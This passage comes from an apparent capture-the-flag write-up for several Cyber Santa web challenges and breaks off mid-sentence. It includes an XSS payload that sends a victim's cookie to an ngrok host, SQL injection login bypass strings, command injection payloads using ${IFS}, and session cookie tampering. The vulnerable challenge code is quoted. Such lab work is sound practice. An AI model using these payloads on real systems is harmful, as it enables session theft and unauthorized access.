</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;img src="http://XXXX.ngrok.io?cookie=</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">" /&gt;</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta11.png" alt="" /></p><p>After sending our XSS payload to the manager, we will subsequently receive a <code class="language-plaintext highlighter-rouge">HTTP</code> request containing the manager’s cookie.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta3.png" alt="" /></p><p>Flag: <code class="language-plaintext highlighter-rouge">HTB{3v1l_3lv3s_4r3_r1s1ng_up!}</code></p><h2 id="toy-management-day-2">Toy Management (Day 2)</h2><blockquote><p>The evil elves have changed the admin access to Santa’s Toy Management Portal. Can you get the access back and save the Christmas?<br /> Downloadable content: <code class="language-plaintext highlighter-rouge">web_toy_management.zip</code></p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta6.png" alt="" /></p><p>We were not provided any credentials and there was no signup feature, so lets take a look at how this login page was implemented.</p><p>We opened up the provided <code class="language-plaintext highlighter-rouge">web_toy_management.zip</code> to get all the files of the application:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="nb">.</span>
├── build-docker.sh
├── challenge
│   ├── database.js
│   ├── database.sql
│   ├── helpers
│   │   └── JWTHelper.js
│   ├── index.js
│   ├── middleware
│   │   └── AuthMiddleware.js
│   ├── package.json
│   ├── routes
│   │   └── index.js
│   ├── static
│   │   ├── ...
│   └── views
│       ├── dashboard.html
│       └── login.html
├── config
│   └── supervisord.conf
├── Dockerfile
└── entrypoint.sh
</pre></table></code></div></div><p>In <code class="language-plaintext highlighter-rouge">challenge/routes/index.js</code>, we see the route <code class="language-plaintext highlighter-rouge">/api/login</code> and its respective code:</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="p">...</span>
<span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/api/login</span><span class="dl">'</span><span class="p">,</span> <span class="k">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="p">{</span> <span class="nx">username</span><span class="p">,</span> <span class="nx">password</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">username</span> <span class="o">&amp;&amp;</span> <span class="nx">password</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">passhash</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createHash</span><span class="p">(</span><span class="dl">'</span><span class="s1">md5</span><span class="dl">'</span><span class="p">).</span><span class="nx">update</span><span class="p">(</span><span class="nx">password</span><span class="p">).</span><span class="nx">digest</span><span class="p">(</span><span class="dl">'</span><span class="s1">hex</span><span class="dl">'</span><span class="p">);</span>
        <span class="k">return</span> <span class="nx">db</span><span class="p">.</span><span class="nx">loginUser</span><span class="p">(</span><span class="nx">username</span><span class="p">,</span> <span class="nx">passhash</span><span class="p">)</span>
            <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">user</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">user</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">response</span><span class="p">(</span><span class="dl">'</span><span class="s1">Invalid username or password!</span><span class="dl">'</span><span class="p">));</span>
                <span class="nx">JWTHelper</span><span class="p">.</span><span class="nx">sign</span><span class="p">({</span> <span class="na">username</span><span class="p">:</span> <span class="nx">user</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">username</span> <span class="p">})</span>
                    <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">token</span> <span class="o">=&gt;</span> <span class="p">{</span>
                        <span class="nx">res</span><span class="p">.</span><span class="nx">cookie</span><span class="p">(</span><span class="dl">'</span><span class="s1">session</span><span class="dl">'</span><span class="p">,</span> <span class="nx">token</span><span class="p">,</span> <span class="p">{</span> <span class="na">maxAge</span><span class="p">:</span> <span class="mi">43200000</span> <span class="p">});</span>
                        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">response</span><span class="p">(</span><span class="dl">'</span><span class="s1">User authenticated successfully!</span><span class="dl">'</span><span class="p">));</span>
                    <span class="p">})</span>
            <span class="p">})</span>
            <span class="p">.</span><span class="k">catch</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">response</span><span class="p">(</span><span class="dl">'</span><span class="s1">Invalid username or password!</span><span class="dl">'</span><span class="p">)));</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">response</span><span class="p">(</span><span class="dl">'</span><span class="s1">Missing parameters!</span><span class="dl">'</span><span class="p">));</span>
<span class="p">});</span>
<span class="p">...</span>
</pre></table></code></div></div><p>A md5 hash is performed on the submitted <code class="language-plaintext highlighter-rouge">password</code>, and together with the <code class="language-plaintext highlighter-rouge">username</code>, a lookup is performed on the database for a valid user via <code class="language-plaintext highlighter-rouge">db.loginUser()</code>. Lets took at how <code class="language-plaintext highlighter-rouge">db.loginUser()</code> was implemented in <code class="language-plaintext highlighter-rouge">challenge/database.js</code>.</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="p">...</span>
<span class="k">async</span> <span class="nx">loginUser</span><span class="p">(</span><span class="nx">user</span><span class="p">,</span> <span class="nx">pass</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="k">async</span> <span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nx">stmt</span> <span class="o">=</span> <span class="s2">`SELECT username FROM users WHERE username = '</span><span class="p">${</span><span class="nx">user</span><span class="p">}</span><span class="s2">' and password = '</span><span class="p">${</span><span class="nx">pass</span><span class="p">}</span><span class="s2">'`</span><span class="p">;</span>
        <span class="k">this</span><span class="p">.</span><span class="nx">connection</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span><span class="nx">stmt</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">result</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
                    <span class="nx">reject</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
            <span class="k">try</span> <span class="p">{</span>
                    <span class="nx">resolve</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">result</span><span class="p">)))</span>
            <span class="p">}</span>
            <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">reject</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span>
            <span class="p">}</span>
        <span class="p">})</span>
    <span class="p">});</span>
<span class="p">}</span>
<span class="p">...</span>
</pre></table></code></div></div><p>In the <code class="language-plaintext highlighter-rouge">stmt</code> variable is a SQL statement that is used to check if a user with the given username and password hash exists in the database. But one thing to note is that the username and password were being included via format string, which while it might look like an attempt to prevent SQL injection, it actually doesn’t.</p><p>If we enter <code class="language-plaintext highlighter-rouge">' or 1=1 --&lt;space&gt;</code> for the <code class="language-plaintext highlighter-rouge">username</code> and any arbitrary <code class="language-plaintext highlighter-rouge">password</code>,</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta9.png" alt="" /></p><p>the resulting query will be</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>SELECT username FROM users WHERE username = '' or 1=1 -- ' and password = 'XXX'
</pre></table></code></div></div><p>Which will return all the records in the <code class="language-plaintext highlighter-rouge">users</code> table and allow us to login as <code class="language-plaintext highlighter-rouge">manager</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta7.png" alt="" /></p><p>However, as <code class="language-plaintext highlighter-rouge">manager</code>, the flag is still nowhere to be seen in the dashboard. So where is it? Checking the <code class="language-plaintext highlighter-rouge">challenge/database.sql</code> file,</p><div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="c1">-- Dumping data for table `toylist`</span>
<span class="c1">--</span>

<span class="k">INSERT</span> <span class="k">INTO</span> <span class="nv">`toylist`</span> <span class="p">(</span><span class="nv">`id`</span><span class="p">,</span> <span class="nv">`toy`</span><span class="p">,</span> <span class="nv">`receiver`</span><span class="p">,</span> <span class="nv">`location`</span><span class="p">,</span> <span class="nv">`approved`</span><span class="p">)</span> <span class="k">VALUES</span>
<span class="p">(</span><span class="mi">1</span><span class="p">,</span>  <span class="s1">'She-Ra, Princess of Power'</span><span class="p">,</span> <span class="s1">'Elaina Love'</span><span class="p">,</span> <span class="s1">'Houston'</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
<span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s1">'Bayblade Burst Evolution'</span><span class="p">,</span> <span class="s1">'Jarrett Pace'</span><span class="p">,</span> <span class="s1">'Dallas'</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
<span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s1">'Barbie Dreamhouse Playset'</span><span class="p">,</span> <span class="s1">'Kristin Vang'</span><span class="p">,</span> <span class="s1">'Austin'</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
<span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s1">'StarWars Action Figures'</span><span class="p">,</span> <span class="s1">'Jaslyn Huerta'</span><span class="p">,</span> <span class="s1">'Amarillo'</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
<span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="s1">'Hot Wheels: Volkswagen Beach Bomb'</span><span class="p">,</span> <span class="s1">'Eric Cameron'</span><span class="p">,</span> <span class="s1">'San Antonio'</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
<span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="s1">'Polly Pocket dolls'</span><span class="p">,</span> <span class="s1">'Aracely Monroe'</span><span class="p">,</span> <span class="s1">'El Paso'</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
<span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s1">'HTB{f4k3_fl4g_f0r_t3st1ng}'</span><span class="p">,</span> <span class="s1">'HTBer'</span><span class="p">,</span> <span class="s1">'HTBland'</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="c1">-- --------------------------------------------------------</span>
</pre></table></code></div></div><p>The flag is indeed in the database, but is marked as unapproved as seen as the <code class="language-plaintext highlighter-rouge">0</code> in the <code class="language-plaintext highlighter-rouge">approved</code> column. If we check the code for the route <code class="language-plaintext highlighter-rouge">/api/toylist</code> in <code class="language-plaintext highlighter-rouge">challenge/routes/index.js</code> that is used to retrieve the list of toys,</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="p">...</span>
<span class="nx">router</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/api/toylist</span><span class="dl">'</span><span class="p">,</span> <span class="nx">AuthMiddleware</span><span class="p">,</span> <span class="k">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">db</span><span class="p">.</span><span class="nx">getUser</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">username</span><span class="p">)</span>
        <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">user</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nx">approved</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">user</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">username</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">admin</span><span class="dl">'</span><span class="p">)</span> <span class="nx">approved</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="k">return</span> <span class="nx">db</span><span class="p">.</span><span class="nx">listToys</span><span class="p">(</span><span class="nx">approved</span><span class="p">)</span>
                <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">toyInfo</span> <span class="o">=&gt;</span> <span class="p">{</span>
                    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">(</span><span class="nx">toyInfo</span><span class="p">);</span>
                <span class="p">})</span>
                <span class="p">.</span><span class="k">catch</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">response</span><span class="p">(</span><span class="dl">'</span><span class="s1">Something went wrong!</span><span class="dl">'</span><span class="p">)));</span>
        <span class="p">})</span>
        <span class="p">.</span><span class="k">catch</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">response</span><span class="p">(</span><span class="dl">'</span><span class="s1">Something went wrong!</span><span class="dl">'</span><span class="p">)));</span>
<span class="p">});</span>
<span class="p">...</span>
</pre></table></code></div></div><p>We see that as the <code class="language-plaintext highlighter-rouge">admin</code> user, the <code class="language-plaintext highlighter-rouge">approved</code> variable will be set to <code class="language-plaintext highlighter-rouge">0</code> and then passed to <code class="language-plaintext highlighter-rouge">db.listToys()</code> to fetch all unapproved toys.</p><p>Therefore, we will need to login as <code class="language-plaintext highlighter-rouge">admin</code>. To do so, we will just need to logout and tweak our initial SQL injection payload to return only the <code class="language-plaintext highlighter-rouge">admin</code> record, which can be done by changing it to <code class="language-plaintext highlighter-rouge">admin' --&lt;space&gt;</code>,</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta10.png" alt="" /></p><p>which will result in the following SQL statement to be executed:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>SELECT username FROM users WHERE username = 'admin' -- ' and password = 'XXX'
</pre></table></code></div></div><p>and allow us to login as <code class="language-plaintext highlighter-rouge">admin</code> to retrieve the flag.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta8.png" alt="" /></p><p>Flag: <code class="language-plaintext highlighter-rouge">HTB{1nj3cti0n_1s_in3v1t4bl3}</code></p><h2 id="gadget-santa-day-3">Gadget Santa (Day 3)</h2><blockquote><p>It seems that the evil elves have broken the controller gadget for the good old candy cane factory! Can you team up with the real red teamer Santa to hack back?<br /> Downloadable content: <code class="language-plaintext highlighter-rouge">web_gadget_santa.zip</code></p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta17.png" alt="" /></p><p>We are presented with a few buttons on the left that seems to execute some fixed commands on the system. Clicking on <code class="language-plaintext highlighter-rouge">List Processes</code> produces the output of the <code class="language-plaintext highlighter-rouge">ps</code> command on the right.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta18.png" alt="" /></p><p>Lets check out the source code to see how it works. Here are the contents of <code class="language-plaintext highlighter-rouge">web_gadget_santa.zip</code>:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="nb">.</span>
├── build-docker.sh
├── challenge
│   ├── controllers
│   │   └── MonitorController.php
│   ├── index.php
│   ├── models
│   │   └── MonitorModel.php
│   ├── Router.php
│   ├── static
│   │   ├── ...
│   └── views
│       └── index.php
├── config
│   ├── fpm.conf
│   ├── nginx.conf
│   ├── santa_mon.sh
│   ├── supervisord.conf
│   └── ups_manager.py
└── Dockerfile
</pre></table></code></div></div><p>We can jump straight to <code class="language-plaintext highlighter-rouge">challenge/controllers/MonitorController.php</code>.</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="kd">class</span> <span class="nc">MonitorController</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">index</span><span class="p">(</span><span class="nv">$router</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$command</span> <span class="o">=</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'command'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'command'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">'welcome'</span><span class="p">;</span>
        <span class="nv">$monitor</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">MonitorModel</span><span class="p">(</span><span class="nv">$command</span><span class="p">);</span>
        <span class="k">return</span> <span class="nv">$router</span><span class="o">-&gt;</span><span class="nf">view</span><span class="p">(</span><span class="s1">'index'</span><span class="p">,</span> <span class="p">[</span><span class="s1">'output'</span> <span class="o">=&gt;</span> <span class="nv">$monitor</span><span class="o">-&gt;</span><span class="nf">getOutput</span><span class="p">()]);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>We see that it is using the <code class="language-plaintext highlighter-rouge">command</code> parameter to create a <code class="language-plaintext highlighter-rouge">MonitorModel</code> object. Previously when we clicked on <code class="language-plaintext highlighter-rouge">List Processes</code>, the <code class="language-plaintext highlighter-rouge">command</code> parameter was set to <code class="language-plaintext highlighter-rouge">list_processes</code>. Perhaps <code class="language-plaintext highlighter-rouge">command</code> is being executed by the system?</p><p>We then jump to <code class="language-plaintext highlighter-rouge">challenge/models/MonitorModel.php</code> to learn more about <code class="language-plaintext highlighter-rouge">MonitorModel</code>.</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="kd">class</span> <span class="nc">MonitorModel</span>
<span class="p">{</span>   
    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$command</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">command</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">sanitize</span><span class="p">(</span><span class="nv">$command</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">sanitize</span><span class="p">(</span><span class="nv">$command</span><span class="p">)</span>
    <span class="p">{</span>   
        <span class="nv">$command</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/\s+/'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$command</span><span class="p">);</span>
        <span class="k">return</span> <span class="nv">$command</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">getOutput</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s1">'/santa_mon.sh '</span><span class="mf">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">command</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>We see that <code class="language-plaintext highlighter-rouge">command</code> is first sanitized by removing all whitespace characters in the <code class="language-plaintext highlighter-rouge">sanitize()</code> method and then appended to <code class="language-plaintext highlighter-rouge">/santa_mon.sh </code> before being executed via <code class="language-plaintext highlighter-rouge">shell_exec</code>, which runs the given command in a shell.</p><p>So if we set <code class="language-plaintext highlighter-rouge">command</code> to <code class="language-plaintext highlighter-rouge">;id</code>, we see that we managed to execute the <code class="language-plaintext highlighter-rouge">id</code> command.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta19.png" alt="" /></p><p>However, because any space characters will be removed from our command, we need to find an alternative method to add whitespaces. One way was to use <code class="language-plaintext highlighter-rouge">${IFS}</code>. So if set <code class="language-plaintext highlighter-rouge">command</code> to <code class="language-plaintext highlighter-rouge">ls${IFS}-al</code>, we will be able to properly execute it.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta20.png" alt="" /></p><p>Now that we have command injection, we can now attempt to read the flag. Referring back to the files given, there were references to the flag in <code class="language-plaintext highlighter-rouge">config/ups_manager.py</code>.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="p">...</span>
<span class="p">...</span>
<span class="k">def</span> <span class="nf">http_server</span><span class="p">(</span><span class="n">host_port</span><span class="p">,</span><span class="n">content_type</span><span class="o">=</span><span class="s">"application/json"</span><span class="p">):</span>
    <span class="k">class</span> <span class="nc">CustomHandler</span><span class="p">(</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">):</span>
        <span class="k">def</span> <span class="nf">do_GET</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
            <span class="p">...</span>
            <span class="k">elif</span> <span class="bp">self</span><span class="p">.</span><span class="n">path</span> <span class="o">==</span> <span class="s">'/get_flag'</span><span class="p">:</span>
                    <span class="n">resp_ok</span><span class="p">()</span>
                    <span class="bp">self</span><span class="p">.</span><span class="n">wfile</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">get_json</span><span class="p">({</span><span class="s">'status'</span><span class="p">:</span> <span class="s">'HTB{f4k3_fl4g_f0r_t3st1ng}'</span><span class="p">}))</span>
                    <span class="k">return</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">send_error</span><span class="p">(</span><span class="mi">404</span><span class="p">,</span> <span class="s">'404 not found'</span><span class="p">)</span>
        <span class="k">def</span> <span class="nf">log_message</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="nb">format</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">):</span>
                <span class="k">pass</span>
    <span class="k">class</span> <span class="nc">_TCPServer</span><span class="p">(</span><span class="n">TCPServer</span><span class="p">):</span>
            <span class="n">allow_reuse_address</span> <span class="o">=</span> <span class="bp">True</span>
    <span class="n">httpd</span> <span class="o">=</span> <span class="n">_TCPServer</span><span class="p">(</span><span class="n">host_port</span><span class="p">,</span> <span class="n">CustomHandler</span><span class="p">)</span>
    <span class="n">httpd</span><span class="p">.</span><span class="n">serve_forever</span><span class="p">()</span>

<span class="n">http_server</span><span class="p">((</span><span class="s">'127.0.0.1'</span><span class="p">,</span><span class="mi">3000</span><span class="p">))</span>
</pre></table></code></div></div><p>This code runs a web server on <code class="language-plaintext highlighter-rouge">127.0.0.1</code> at port 3000. From the website, if we click on <code class="language-plaintext highlighter-rouge">List Connections</code>, we see that there is indeed a service running on <code class="language-plaintext highlighter-rouge">127.0.0.1:3000</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta21.png" alt="" /></p><p>Back to the code, it says that when the web server receives a request with the path <code class="language-plaintext highlighter-rouge">/get_flag</code> using the <code class="language-plaintext highlighter-rouge">GET</code> method, it will return us the flag. Nice! We just need to set the <code class="language-plaintext highlighter-rouge">command</code> parameter to <code class="language-plaintext highlighter-rouge">;curl${IFS}http://127.0.0.1:3000/get_flag</code> to fetch the page and we get the flag.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta22.png" alt="" /></p><p>Flag: <code class="language-plaintext highlighter-rouge">HTB{54nt4_i5_th3_r34l_r3d_t34m3r}</code></p><h2 id="elf-directory-day-4">Elf Directory (Day 4)</h2><blockquote><p>Can you infiltrate the Elf Directory to get a foothold inside Santa’s data warehouse in the North Pole?</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta23.png" alt="" /></p><p>With no credentials, we went ahead and clicked on <code class="language-plaintext highlighter-rouge">Create one!</code> to register a new account.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta24.png" alt="" /></p><p>After registering, we logged in with our credentials.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta25.png" alt="" /></p><p>On the bottom, it says that we didn’t have permission to edit our profile and we needed to contact the administrator. Since the form didn’t work, I decided to check out the cookie that was assigned when I first logged in.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta26.png" alt="" /></p><p>We see that we got the usual <code class="language-plaintext highlighter-rouge">PHPSESSID</code> cookie, but one thing that stood out was the value of it. It did not seem like the usual <code class="language-plaintext highlighter-rouge">PHPSESSID</code> value to me and it looked to me as a base64-encoded string so I attempted to decode it.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta27.png" alt="" /></p><p>Turns out it was a JSON containing my username and a boolean value called <code class="language-plaintext highlighter-rouge">approved</code>. Lets see what happens if we set <code class="language-plaintext highlighter-rouge">approved</code> to true?</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta28.png" alt="" /></p><p>We copy the output and replace the value of <code class="language-plaintext highlighter-rouge">PHPSESSID</code> cookie and hit refresh.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta29.png" alt="" /></p><p>We see that the error message was gone and we now have the option of upload a new profile avatar picture. I tried uploading a <code 